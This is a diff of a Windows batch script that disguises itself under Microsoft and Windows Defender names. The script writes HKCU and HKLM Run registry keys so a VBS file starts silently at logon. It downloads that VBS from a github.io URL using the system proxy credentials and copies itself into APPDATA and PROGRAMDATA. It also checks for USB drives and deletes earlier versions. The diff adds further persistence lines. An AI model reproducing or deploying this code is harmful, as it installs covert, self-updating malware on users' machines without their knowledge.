@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 cls
 
-set "version=2.4"
+set "version=2.5"
 
 
 rem check for usb drive
@@ -72,7 +72,7 @@ if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftU
 )
 
 
-rem:: PC Autostart
+rem PC Autostart
 set "pcauto=NON"
 if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     set "pcauto=YES"
@@ -125,29 +125,31 @@ if not exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
 
 
 rem USER registry
+powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
 set "userregistryauto=NON"
-if exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
-    powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
+powershell -Command "if ((Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity').WindowsDefenderSecurity -ne $null) { exit 0 } else { exit 1 }"
+if %errorlevel% equ 0 (
     set "userregistryauto=YES"
+) else (
+    set "userregistryauto=NON"
 )
 if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     mkdir "%APPDATA%/WindowsDefenderSecurity/"
     copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
     powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
-    powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
-    set "userregistryauto=YES"
 )
 
 
 rem PC registry
+if "%AdminRights%"=="true" (
+    powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
+)
 set "pcregistryauto=NON"
-if exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
-    if "%AdminRights%"=="true" (
-        powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-        set "pcregistryauto=YES"
-    ) else (
-        set "pcregistryauto=NON"
-    )
+powershell -Command "if ((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity').WindowsDefenderSecurity -ne $null) { exit 0 } else { exit 1 }"
+if %errorlevel% equ 0 (
+    set "pcregistryauto=YES"
+) else (
+    set "pcregistryauto=NON"
 )
 if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     if "%UsbDrive%"=="true" (
@@ -159,13 +161,6 @@ if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs"
         mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
         copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
         powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
-    )
-
-    if "%AdminRights%"=="true" (
-        powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-        set "pcregistryauto=YES"
-    ) else (
-        set "pcregistryauto=NON"
     )
 )
 
@@ -202,13 +197,16 @@ if "%AdminRights%"=="true" (
 )
 
 
-rem:: delete old files
-if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
-    del /f /s /q "%APPDATA%\MicrosoftDefenderSecurity"
+rem delete old files
+if exist "%APPDATA%\MicrosoftDefenderSecurity\" (
+    rd /s /q "%APPDATA%\MicrosoftDefenderSecurity"
 )
-if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
+if exist "%PROGRAMDATA%\MicrosoftDefenderSecurity\" (
     if "%AdminRights%"=="true" (
-        del /f /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity"
+        rd /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity"
+    )
+    if "%UsbDrive%"=="true" (
+        rd /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity"
     )
 )
 
